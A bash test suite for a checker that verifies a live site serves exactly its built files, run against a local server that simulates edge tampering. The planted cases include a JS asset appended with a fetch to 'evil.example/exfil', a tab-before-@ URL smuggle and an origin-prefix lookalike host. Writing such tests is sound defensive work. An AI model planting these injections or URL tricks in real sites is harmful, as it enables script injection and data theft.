#!/usr/bin/env bash
# Adversarial self-test for tools/check-live-routes.py.
#
# Every case runs the REAL checker against a REAL HTTP server serving a fixture, because the
# thing being tested is what the checker sees on the wire. A test that called
# `differences()` directly would be testing a diff function; the defect this checker exists
# for was an edge rewriting a body in flight, and the only way to model that honestly is to
# serve a modified body.
#
# THE SERVER IMITATES THE DEFECT, INCLUDING ITS CONDITIONALITY. Cloudflare's injection is
# conditional on the request looking like a browser -- plain `curl` gets the clean document --
# which is why it survived every manual look. One case below serves the injection ONLY to a
# browser User-Agent, so a checker that dropped its browser headers would go green over a
# planted defect.
#
# Usage: tools/test-check-live-routes.sh

set -uo pipefail

here="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
checker="$here/check-live-routes.py"
workroot=""
server_pid=""

cleanup() {
  trap - EXIT INT TERM HUP
  [ -n "$server_pid" ] && kill "$server_pid" 2>/dev/null
  [ -n "$workroot" ] && rm -rf "$workroot"
  # THE PROBE COPY TOO. It sits in `tools/` beside the original (a copy in a temp directory
  # resolves its own paths wrongly), so an interrupted run would otherwise leave a deliberately
  # broken checker there, and `check-no-generated-files.sh` has no pattern for it.
  rm -f "$here/.live-routes-probe-fixture.py" "$here/.live-routes-config-probe.py"
  return 0
}
trap cleanup EXIT INT TERM HUP

pass=0
fail=0
workroot="$(mktemp -d)"
dist="$workroot/dist"

# A BUILD OF THREE ROUTES, written here rather than copied from `apps/web/dist`: this suite
# must run on a clean checkout with no build, and it is testing the checker rather than the
# site.
# THE PROPAGATION WAIT IS SHORTENED HERE, AND NOWHERE ELSE.
#
# Every "must be refused" case below plants content that never converges -- that is what makes
# it a case -- so at the production deadline each would wait three minutes before failing and
# this suite would be unusable. Zero here means "compare immediately", which is what every case
# was written against.
#
# THE ONE CASE THAT MUST NOT USE IT is `the wait does not mask a rewrite`, below: it sets a real
# deadline deliberately, because a knob that turns a defence off needs one case proving the
# defence still holds when the knob is not turned.
export BURROW_LIVE_PROPAGATION_DEADLINE_S=0

PORT=8734
ORIGIN="http://127.0.0.1:$PORT"

# THE FIXTURE'S ABSOLUTE URLS ARE ON THE TEST ORIGIN, and that is a positive control as well as
# a fixture detail: a page legitimately carries absolute same-origin URLs (the canonical link is
# one on every burrow page), so the foreign-reference rule must accept those and refuse only
# another origin. An earlier fixture used a different host and the BASELINE failed -- correctly,
# which is how this was noticed.
mkdir -p "$dist" "$dist/merge-pdf" "$dist/credits"
cat >"$dist/index.html" <<HTML
<!doctype html><html lang="en"><head><meta charset="utf-8">
<title>burrow</title><link rel="canonical" href="https://elsewhere.example/">
<link rel="stylesheet" href="$ORIGIN/a.css">
<script type="module" src="/_astro/page.js"></script></head>
<body><h1>burrow</h1></body></html>
HTML
cat >"$dist/merge-pdf/index.html" <<HTML
<!doctype html><html lang="en"><head><meta charset="utf-8">
<title>Merge PDF</title><link rel="canonical" href="$ORIGIN/merge-pdf/">
</head><body><h1>Merge PDF</h1></body></html>
HTML
cat >"$dist/credits/index.html" <<HTML
<!doctype html><html lang="en"><head><meta charset="utf-8">
<title>Credits</title></head><body><h1>Credits</h1>
<p>Source at <a href="https://github.com/TensorGreed/burrow">GitHub</a>,
licence at <a href="https://spdx.org/licenses/BSD-2-Clause.html">SPDX</a>.</p>
</body></html>
HTML

# A SITEMAP, because the checker compares the number of HTML routes it found against the number
# the build's own sitemap lists -- an independent count of the same fact, which is what stops a
# scan that found one route from printing OK. And an ASSET, because the check covers every file
# in the build rather than only its HTML: `_astro/*.js` carries no `integrity`, so an edge
# serving a modified island bundle is caught by this diff or by nothing.
mkdir -p "$dist/_astro"
printf 'console.log("island");\n' >"$dist/_astro/page.js"

# A `_headers` FILE, which the host CONSUMES rather than serves. The server below models what
# Cloudflare Pages actually does with it -- answers 200 with the site's HTML, not a 404 -- which
# is what made the first real deploy red for a reason that was the checker's fault and not the
# site's: it compared a config file against a web page.
printf '/*\n  X-Content-Type-Options: nosniff\n' >"$dist/_headers"
cat >"$dist/sitemap.xml" <<XML
<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
  <url><loc>$ORIGIN/</loc></url>
  <url><loc>$ORIGIN/merge-pdf/</loc></url>
  <url><loc>$ORIGIN/credits/</loc></url>
</urlset>
XML

# The server. `MODE` decides what it does to the body on the way out, which is the edge
# behaviour being modelled.
cat >"$workroot/server.py" <<'PY'
import os, sys, http.server, pathlib

DIST = pathlib.Path(sys.argv[1])
MODE = os.environ.get("MODE", "clean")
BEACON = b'<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v31"></script>'
# THE ORIGIN AS A PREFIX OF SOMEBODY ELSE'S HOST, which is the shape that actually binds the
# structural comparison. A first attempt used `127.0.0.1.evil.example:8734` -- a lookalike, but
# one `startswith` ALSO rejects, so the case passed under both implementations and bound
# nothing. Measured: replacing `urlsplit` with `startswith` left the suite green until this
# string changed. `http://127.0.0.1:8734.evil.example` starts with the origin character for
# character and is a different host.
LOOKALIKE = b"http://127.0.0.1:8734.evil.example"

class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, *args):
        pass

    def do_GET(self):
        path = self.path.split("?")[0]
        # `_headers` IS CONFIGURATION. Pages consumes it and answers this path with the site's
        # HTML at status 200 -- not a 404 -- so a checker that compared it would see a web page
        # where it expected a config file.
        if path == "/_headers":
            body = (DIST / "index.html").read_bytes()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers(); self.wfile.write(body); return
        if MODE == "redirect" and path.endswith("/"):
            self.send_response(302)
            self.send_header("Location", path + "index.html")
            self.end_headers(); return
        if path == "/__mode":
            payload = MODE.encode()
            self.send_response(200); self.send_header("Content-Length", str(len(payload)))
            self.end_headers(); self.wfile.write(payload); return
        file = DIST / (path.lstrip("/") + "index.html" if path.endswith("/") else path.lstrip("/"))
        if not file.is_file():
            self.send_response(404); self.end_headers(); return
        body = file.read_bytes()
        browser = "Mozilla" in self.headers.get("User-Agent", "")
        if MODE == "inject":
            body = body.replace(b"</head>", BEACON + b"</head>")
        elif MODE == "inject-browser-only" and browser:
            body = body.replace(b"</head>", BEACON + b"</head>")
        elif MODE == "inject-inline":
            body = body.replace(b"</head>", b"<script>window.x=1</script></head>")
        elif MODE == "whitespace":
            body = body + b"\n"
        elif MODE == "tab-smuggle":
            body = body.replace(b"</head>", b'<script src="https://127.0.0.1\t@evil.example/x.js"></script></head>')
        elif MODE == "lookalike":
            body = body.replace(b"</head>", b'<script src="' + LOOKALIKE + b'/x.js"></script></head>')
        elif MODE == "asset" and path.endswith(".js"):
            body = body + b'fetch("https://evil.example/exfil");\n'
        elif MODE == "foreign-stylesheet":
            body = body.replace(b"</head>", b'<link rel="stylesheet" href="https://cdn.example/a.css"></head>')
        elif MODE == "rewrite-attr":
            body = body.replace(b'src="/_astro/page.js"', b'src="https://cdn.example/page.js"')
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

http.server.HTTPServer(("127.0.0.1", int(sys.argv[2])), Handler).serve_forever()
PY

# THE MODE IS CONFIRMED, NOT ASSUMED. `kill` without `wait` leaves the previous server dying
# on the same port, and a readiness probe of `/` is answered just as happily by that one -- so
# a case could run against the PREVIOUS mode and pass for a reason nobody intended. Two of the
# refusal cases share a message, which is exactly where that would hide. The server reports its
# own mode and this polls for the expected value.
start_server() {
  if [ -n "$server_pid" ]; then
    kill "$server_pid" 2>/dev/null
    wait "$server_pid" 2>/dev/null
  fi
  MODE="$1" python3 "$workroot/server.py" "$dist" "$PORT" &
  server_pid=$!
  for _ in $(seq 1 60); do
    if [ "$(curl -s "http://127.0.0.1:$PORT/__mode" 2>/dev/null)" = "$1" ]; then return 0; fi
    sleep 0.1
  done
  echo "  FAIL the fixture server is not in mode '$1'; no case after this means anything" >&2
  exit 1
}

run() { python3 "$checker" "http://127.0.0.1:$PORT" "$dist" 2>&1; }

expect_pass() {
  local name="$1"
  if out="$(run)"; then
    echo "  ok   $name"
    pass=$((pass + 1))
  else
    echo "  FAIL $name: it refused something it must accept"
    sed 's/^/        /' <<<"$out" | tail -4
    fail=$((fail + 1))
  fi
}

expect_refusal() {
  local name="$1" expect="$2"
  local out status=0
  out="$(run)" || status=$?
  if [ "$status" -eq 0 ]; then
    echo "  FAIL $name: it did not refuse"
    fail=$((fail + 1))
    return
  fi
  if ! grep -qF -- "$expect" <<<"$out"; then
    echo "  FAIL $name: it refused, but not for the stated reason"
    echo "        wanted: $expect"
    sed 's/^/        /' <<<"$out" | tail -4
    fail=$((fail + 1))
    return
  fi
  echo "  ok   $name"
  pass=$((pass + 1))
}

echo "check-live-routes: a served body is the built body, and nothing else"
echo

# THE BASELINE. Without it every refusal below could be coming from a checker that refuses
# everything, which is the same non-check as one that refuses nothing.
echo "  must accept ---------------------------------------------------------------"
start_server clean
expect_pass "an untouched build served as-is"

# THE CASE THE FIRST VERSION OF THIS RULE GOT WRONG, and it is a positive control rather than
# a detail. `/credits/` cites twelve licence URLs and every page links to the source on
# GitHub; the first rule flagged all of them as third-party references and refused the real
# site. A hyperlink is not a request -- the browser fetches nothing until somebody clicks --
# and a check that cries wolf over the masthead is a check people learn to ignore.
#
# The `clean` fixture above carries both shapes, so the baseline that just passed IS this
# assertion. Stated separately because a positive control that is only implicit is one that
# disappears the next time somebody edits the fixture.
missing=""
[ -f "$dist/_headers" ] || missing="$missing platform-config-file"
grep -q 'href="https://github.com' "$dist/credits/index.html" || missing="$missing outbound-hyperlink"
grep -q 'rel="canonical" href="https://elsewhere.example/"' "$dist/index.html" ||
  missing="$missing foreign-canonical"
grep -q "rel=\"stylesheet\" href=\"$ORIGIN/a.css\"" "$dist/index.html" ||
  missing="$missing same-origin-subresource"
if [ -z "$missing" ]; then
  echo "  ok   the fixture carries all four accept shapes, and the baseline accepted them:"
  echo "       an outbound hyperlink, a canonical on ANOTHER host, a same-origin stylesheet,"
  echo "       and a _headers the host consumes rather than serves"
  pass=$((pass + 1))
else
  echo "  FAIL the fixture is missing:$missing -- the baseline proves nothing about those"
  fail=$((fail + 1))
fi

echo
echo "  must refuse ---------------------------------------------------------------"

# THE CASE THIS CHECKER EXISTS FOR, planted as it actually happened.
start_server inject
expect_refusal "an injected third-party script is refused" \
  "references 1 origin(s) this build does not"

# AND THE CONDITIONALITY THAT HID IT. Served only to a browser User-Agent: a checker that
# fetched with python's default UA would see the clean document and pass.
start_server inject-browser-only
expect_refusal "an injection served ONLY to a browser User-Agent is refused" \
  "references 1 origin(s) this build does not"

# A REWRITTEN ATTRIBUTE, not an added element: the same file, pointed somewhere else. An
# "is anything added" rule would miss this; a diff does not.
start_server rewrite-attr
expect_refusal "a rewritten src pointing at another origin is refused" \
  "references 1 origin(s) this build does not"

# A FETCHED SUBRESOURCE THAT IS NOT A `src`. `<link rel=stylesheet>` is a real request the
# browser makes on load; `<link rel=canonical>` in the fixture above is not, and must not be
# confused with it.
start_server foreign-stylesheet
expect_refusal "a third-party stylesheet is refused" \
  "references 1 origin(s) this build does not"

# THE LOOKALIKE. `startswith` accepts it and a structural comparison does not -- the shape
# that has been a defect five times here. Without this case, replacing the `urlsplit`
# comparison with `url.startswith(origin)` left the whole suite green; security review
# measured that.
start_server lookalike
expect_refusal "a host that merely BEGINS with the origin is refused" \
  "references 1 origin(s) this build does not"

# THE TAB SMUGGLE, which was worse than a miss: browsers strip TAB/CR/LF before parsing, so
# `https://origin<TAB>@evil.example/x.js` fetches from evil.example -- and the srcset splitter
# truncated it at the tab to exactly the origin, so the rule called a cross-origin fetch
# same-origin.
start_server tab-smuggle
expect_refusal "a URL with a TAB before an @ is refused, not read as same-origin" \
  "references 1 origin(s) this build does not"

# AN ASSET, NOT A DOCUMENT. `_astro/*.js` carries no `integrity` -- only the ENGINE fetch is
# SRI-pinned -- so the island JavaScript that drives a person's file through the worker is
# covered by this diff or by nothing. The first version of this checker looked at the seven
# HTML files and none of the other thirty-four, which is the hole it was written to close, one
# layer down.
start_server asset
expect_refusal "a modified JS asset is refused, though every HTML page is untouched" \
  "serves a body the build did not produce"

# A REDIRECT IS A DIFFERENT DOCUMENT, and `urlopen` follows them silently. This deploy has two
# live origins by design, so "the edge answered with a redirect to the other one" is reachable:
# the check would fetch that host, find it byte-identical, and print OK.
start_server redirect
expect_refusal "a route that redirects is refused rather than followed silently" \
  "that is a different document"

# AN INJECTION WITH NO URL IN IT AT ALL. The foreign-reference pass cannot see this one, and
# it is exactly why the rule is the diff rather than a third-party check: an inline script
# added at the edge is a change to the document whoever wrote the CSP did not authorise.
start_server inject-inline
expect_refusal "an injected INLINE script is refused, though it references nobody" \
  "serves a body the build did not produce"

# AND ONE BYTE. "Any difference the build did not produce" means any.
start_server whitespace
expect_refusal "a single added byte is refused" \
  "serves a body the build did not produce"

echo
echo "  and the checker refuses to run over nothing --------------------------------"
start_server clean
empty="$workroot/empty"
mkdir -p "$empty"
if python3 "$checker" "http://127.0.0.1:$PORT" "$empty" >/dev/null 2>&1; then
  echo "  FAIL an empty build is accepted, so this checker can examine nothing and pass"
  fail=$((fail + 1))
else
  echo "  ok   an empty build is refused rather than passing vacuously"
  pass=$((pass + 1))
fi

if python3 "$checker" "not-a-url" "$dist" >/dev/null 2>&1; then
  echo "  FAIL an origin that is not a URL is accepted"
  fail=$((fail + 1))
else
  echo "  ok   an origin that is not a URL is refused"
  pass=$((pass + 1))
fi

# THE PROBE GATE. Break the diff rule in a COPY and require the planted injection to survive
# it -- so "the diff is what catches this" is measured rather than asserted. The copy sits
# beside the original, because a copy in a temp directory resolves its own paths differently
# and would exit non-zero for the wrong reason, which an exit-code-only assertion reads as a
# pass (`CLAUDE.md`).
echo
echo "  the wait does not mask a rewrite ------------------------------------------"

# THE KNOB'S OWN CONTROL. The wait exists because a propagation lag converges and an edge
# rewrite does not -- so the rewrite must still be caught with a REAL deadline, not only with
# the zero this suite otherwise uses. A short but non-zero one is enough to prove the shape:
# the loop runs, polls, gives up, and compares anyway.
start_server inject
status=0
out="$(BURROW_LIVE_PROPAGATION_DEADLINE_S=6 python3 "$checker" "http://127.0.0.1:$PORT" "$dist" 2>&1)" || status=$?
if [ "$status" -ne 0 ] &&
  grep -qF "still does not match the build after" <<<"$out" &&
  grep -qF "the live origin serves a body the build did not produce" <<<"$out"; then
  echo "  ok   an injection is still refused after the wait, and the wait says it gave up"
  pass=$((pass + 1))
else
  echo "  FAIL the wait masked an injection, or gave up silently (status $status)"
  sed 's/^/        /' <<<"$out" | tail -4
  fail=$((fail + 1))
fi

echo
echo "  probe gate -----------------------------------------------------------------"
copy="$here/.live-routes-probe-fixture.py"
python3 - "$checker" "$copy" <<'PY'
import pathlib, sys
src, dst = pathlib.Path(sys.argv[1]), pathlib.Path(sys.argv[2])
text = src.read_text()
old = "    if built == served:\n        return []"
assert old in text, "MUTATION DID NOT APPLY: the diff's early return has moved"
dst.write_text(text.replace(old, "    if True:\n        return []"))
PY
start_server inject-inline
# THE INPUT IS PROVEN FIRST. "The mutant passes" is satisfied just as well by a server that is
# not injecting at all -- so the REAL checker must refuse this very server before the mutant's
# acceptance means anything. Without this the probe gate could go green over a fixture that
# had quietly stopped planting anything.
if python3 "$checker" "http://127.0.0.1:$PORT" "$dist" >/dev/null 2>&1; then
  echo "  FAIL the probe's input is not injecting, so the mutant passing proves nothing"
  fail=$((fail + 1))
elif python3 "$copy" "http://127.0.0.1:$PORT" "$dist" >/dev/null 2>&1; then
  echo "  ok   with the diff disabled the inline injection survives, so the diff is what catches it"
  pass=$((pass + 1))
else
  echo "  FAIL the inline injection is refused even with the diff disabled, so these cases"
  echo "        are measuring a different rule than the one they name"
  fail=$((fail + 1))
fi
rm -f "$copy"

# THE SECOND PROBE GATE: the platform-config exclusion.
#
# Without this the exclusion is bound only by a mutation somebody ran by hand once, and the
# fixture's `_headers` handler -- which models what Cloudflare Pages really does with that path,
# 200 and the site's HTML rather than a 404 -- proves nothing, because an excluded path is never
# fetched. This makes both load-bearing: the REAL checker must accept the clean fixture, and a
# copy with the exclusion emptied must refuse it NAMING `/_headers`.
copy="$here/.live-routes-config-probe.py"
python3 - "$checker" "$copy" <<'PY'
import pathlib, sys
src, dst = pathlib.Path(sys.argv[1]), pathlib.Path(sys.argv[2])
text = src.read_text()
old = 'PLATFORM_CONFIG = frozenset({"_headers", "_redirects", "_routes.json", "_worker.js"})'
assert old in text, "MUTATION DID NOT APPLY: the PLATFORM_CONFIG literal has moved"
dst.write_text(text.replace(old, "PLATFORM_CONFIG = frozenset()"))
PY
start_server clean
if ! python3 "$checker" "http://127.0.0.1:$PORT" "$dist" >/dev/null 2>&1; then
  echo "  FAIL the real checker refuses the clean fixture, so the probe below proves nothing"
  fail=$((fail + 1))
elif out="$(python3 "$copy" "http://127.0.0.1:$PORT" "$dist" 2>&1)"; then
  echo "  FAIL with the exclusion emptied the build still passes, so the exclusion is not"
  echo "        what makes _headers pass -- these cases measure a different rule"
  fail=$((fail + 1))
elif ! grep -qF "/_headers" <<<"$out"; then
  echo "  FAIL with the exclusion emptied it refuses, but not about _headers"
  fail=$((fail + 1))
else
  echo "  ok   with the exclusion emptied, _headers is refused -- so the exclusion is what"
  echo "       makes a host-consumed file pass, and the fixture's 200+HTML model is real"
  pass=$((pass + 1))
fi
rm -f "$copy"

echo
if [ "$fail" -ne 0 ]; then
  echo "FAILED — $fail case(s) failed, $pass passed" >&2
  exit 1
fi
echo "OK — $pass case(s) all behaved as required"
